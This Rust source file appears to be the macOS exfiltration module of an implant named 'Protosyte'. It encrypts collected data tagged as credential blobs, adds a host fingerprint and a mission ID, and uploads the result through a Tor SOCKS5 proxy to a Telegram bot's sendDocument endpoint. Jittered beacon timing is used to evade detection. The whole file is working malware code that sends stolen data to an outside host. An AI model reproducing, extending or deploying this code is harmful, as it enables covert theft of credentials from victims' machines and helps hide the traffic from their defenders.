// macOS version - same as Linux version
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time::{sleep, Instant};
use reqwest::Client;
use zeroize::Zeroize;
use std::env;

use crate::crypto::CryptoManager;
use crate::proto::{Envelope, DataBlob, envelope::Payload, data_blob::DataType};
use prost::Message;
use prost_types::Timestamp;
use sha2::{Sha256, Digest};
use hmac::{Hmac, Mac};

fn get_bot_token() -> String {
    env::var("PROTOSYTE_BOT_TOKEN")
        .unwrap_or_else(|_| obfuscated_token())
}

fn obfuscated_token() -> String {
    String::new()
}

fn get_bot_endpoint() -> String {
    let token = get_bot_token();
    if token.is_empty() {
        return String::new();
    }
    format!("https://api.telegram.org/bot{}/sendDocument", token)
}

pub struct ExfiltrationEngine {
    crypto: Arc<CryptoManager>,
    data_rx: mpsc::UnboundedReceiver<Vec<u8>>,
    interval: Duration,
    jitter: f32,
    mission_id: u64,
    sequence: std::sync::atomic::AtomicU32,
    host_fingerprint: Vec<u8>,
}

impl ExfiltrationEngine {
    pub fn new(crypto: Arc<CryptoManager>, data_rx: mpsc::UnboundedReceiver<Vec<u8>>) -> Self {
        // Get mission ID from environment
        let mission_id = env::var("PROTOSYTE_MISSION_ID")
            .unwrap_or_else(|_| "0xDEADBEEFCAFEBABE".to_string());
        let mission_id_uint = u64::from_str_radix(
            mission_id.trim_start_matches("0x"),
            16
        ).unwrap_or(0xDEADBEEFCAFEBABE);
        
        // Generate host fingerprint
        let host_fingerprint = Self::generate_host_fingerprint();
        
        Self {
            crypto,
            data_rx,
            interval: Duration::from_secs(347),
            jitter: 0.25,
            mission_id: mission_id_uint,
            sequence: std::sync::atomic::AtomicU32::new(0),
            host_fingerprint,
        }
    }
    
    fn generate_host_fingerprint() -> Vec<u8> {
        use sha2::{Sha256, Digest};
        let mut hasher = Sha256::new();
        
        // Use hostname
        if let Ok(hostname) = env::var("HOSTNAME") {
            hasher.update(hostname.as_bytes());
        }
        
        // macOS-specific identifiers
        if let Ok(computer_name) = env::var("COMPUTER_NAME") {
            hasher.update(computer_name.as_bytes());
        }
        
        hasher.finalize().to_vec()
    }
    
    pub async fn start(mut self) {
        // macOS: Tor typically on 127.0.0.1:9050
        let proxy = reqwest::Proxy::all("socks5://127.0.0.1:9050")
            .expect("Failed to create SOCKS5 proxy");
        
        let client = Client::builder()
            .proxy(proxy)
            .timeout(Duration::from_secs(30))
            .build()
            .expect("Failed to create HTTP client");
        
        let bot_token = get_bot_token();
        if bot_token.is_empty() {
            eprintln!("[EXFIL] Bot token not configured");
            return;
        }
        
        let mut last_send = Instant::now();
        
        loop {
            tokio::select! {
                data = self.data_rx.recv() => {
                    match data {
                        Some(raw_data) => {
                            // Encrypt the raw data
                            let (encrypted_payload, nonce) = self.crypto.encrypt_with_nonce(&raw_data).await;
                            
                            // Create Protobuf Envelope
                            let envelope_result = self.create_envelope(
                                &encrypted_payload,
                                &nonce,
                                raw_data.len() as u32,
                            );
                            
                            let envelope_bytes = match envelope_result {
                                Ok(bytes) => bytes,
                                Err(e) => {
                                    eprintln!("[EXFIL] Failed to create envelope: {}", e);
                                    continue;
                                }
                            };
                            
                            let jitter_duration = self.calculate_jitter();
                            if last_send.elapsed() < self.interval + jitter_duration {
                                sleep(self.interval + jitter_duration - last_send.elapsed()).await;
                            }
                            
                            // Send Protobuf-wrapped payload
                            if let Err(e) = self.send_payload(&client, &envelope_bytes).await {
                                eprintln!("[EXFIL] Failed to send payload: {}", e);
                            } else {
                                last_send = Instant::now();
                            }
                        }
                        None => break,
                    }
                }
            }
        }
    }
    
    fn calculate_jitter(&self) -> Duration {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let jitter_amount = rng.gen_range(-self.jitter..=self.jitter);
        let jitter_secs = (self.interval.as_secs_f32() * jitter_amount) as u64;
        Duration::from_secs(jitter_secs)
    }
    
    fn create_envelope(
        &self,
        encrypted_payload: &[u8],
        nonce: &[u8],
        original_size: u32,
    ) -> Result<Vec<u8>, String> {
        use sha2::{Sha256, Digest};
        use hmac::{Hmac, Mac};
        
        // Get next sequence number
        let sequence = self.sequence.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        
        // Create DataBlob
        let data_blob = DataBlob {
            host_fingerprint: self.host_fingerprint.clone(),
            data_type: DataType::CredentialBlob as i32,
            encrypted_payload: encrypted_payload.to_vec(),
            aes_gcm_nonce: nonce.to_vec(),
            original_size,
        };
        
        // Create Envelope
        let mut envelope = Envelope {
            mission_id: self.mission_id,
            collected_ts: Some(Timestamp {
                seconds: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs() as i64,
                nanos: 0,
            }),
            sequence,
            hmac_sha256: vec![],
            payload: Some(Payload::Data(data_blob)),
        };
        
        // Compute HMAC
        let hmac_key = env::var("PROTOSYTE_HMAC_KEY")
            .unwrap_or_else(|_| {
                env::var("PROTOSYTE_PASSPHRASE")
                    .unwrap_or_else(|_| "default_key_change_in_production".to_string())
            });
        
        let mut hmac_envelope = Envelope {
            mission_id: envelope.mission_id,
            collected_ts: envelope.collected_ts.clone(),
            sequence: envelope.sequence,
            hmac_sha256: vec![],
            payload: envelope.payload.clone(),
        };
        
        let mut hmac_data = Vec::new();
        hmac_envelope.encode(&mut hmac_data)
            .map_err(|e| format!("Failed to encode for HMAC: {}", e))?;
        
        type HmacSha256 = Hmac<Sha256>;
        let mut mac = HmacSha256::new_from_slice(hmac_key.as_bytes())
            .map_err(|e| format!("Failed to create HMAC: {}", e))?;
        mac.update(&hmac_data);
        envelope.hmac_sha256 = mac.finalize().into_bytes().to_vec();
        
        // Encode final envelope
        let mut encoded = Vec::new();
        envelope.encode(&mut encoded)
            .map_err(|e| format!("Failed to encode envelope: {}", e))?;
        
        Ok(encoded)
    }
    
    async fn send_payload(&self, client: &Client, payload: &[u8]) -> Result<(), String> {
        let endpoint = get_bot_endpoint();
        if endpoint.is_empty() {
            return Err("Bot endpoint not configured".to_string());
        }
        
        let form = reqwest::multipart::Form::new()
            .part("document", reqwest::multipart::Part::bytes(payload.to_vec())
                .file_name("data.bin")
                .mime_str("application/octet-stream")
                .map_err(|e| format!("Failed to create part: {}", e))?);
        
        let response = client
            .post(&endpoint)
            .multipart(form)
            .send()
            .await
            .map_err(|e| format!("Request failed: {}", e))?;
        
        if response.status().is_success() {
            Ok(())
        } else {
            Err(format!("HTTP error: {}", response.status()))
        }
    }
}

